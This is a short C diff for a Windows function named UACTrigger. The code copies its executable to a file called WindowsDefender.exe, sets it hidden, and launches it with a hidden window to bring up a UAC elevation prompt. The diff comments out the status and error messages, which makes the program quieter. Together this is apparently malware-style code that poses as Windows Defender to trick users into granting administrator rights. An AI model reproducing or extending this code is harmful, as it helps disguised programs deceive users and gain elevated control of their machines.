@@ -13,19 +13,19 @@ void UACTrigger() {
 
     SHELLEXECUTEINFO sei = {sizeof(sei)};
 
-    WriteOutput("Copying to WindowsDefender.exe\n");
+    // WriteOutput("Copying to WindowsDefender.exe\n");
     if(!CopyFile( DIR , "WindowsDefender.exe", FALSE ))
     {
-        memset(err, 0, 200);
-        snprintf(err, 200,"\nError : %i\n", GetLastError());
-        WriteOutput("Error Copying file!");
-        WriteOutput(err);
+        // memset(err, 0, 200);
+        // snprintf(err, 200,"\nError : %i\n", GetLastError());
+        // WriteOutput("Error Copying file!");
+        // WriteOutput(err);
     }
 
     DWORD attributes = GetFileAttributes("WindowsDefender.exe");
     if (attributes != FILE_ATTRIBUTE_HIDDEN)
     {
-        WriteOutput("Hiding WindowsDefender.exe");
+        // WriteOutput("Hiding WindowsDefender.exe");
         SetFileAttributes("WindowsDefender.exe", attributes + FILE_ATTRIBUTE_HIDDEN);
     }
 
@@ -34,7 +34,7 @@ void UACTrigger() {
     sei.hwnd = NULL;
     sei.nShow = SW_HIDE;
 
-    WriteOutput("Triggering UAC Prompt\n");
+    // WriteOutput("Triggering UAC Prompt\n");
     if (!ShellExecuteEx(&sei)) {
         DWORD dwError = GetLastError();
         if (dwError == ERROR_CANCELLED)
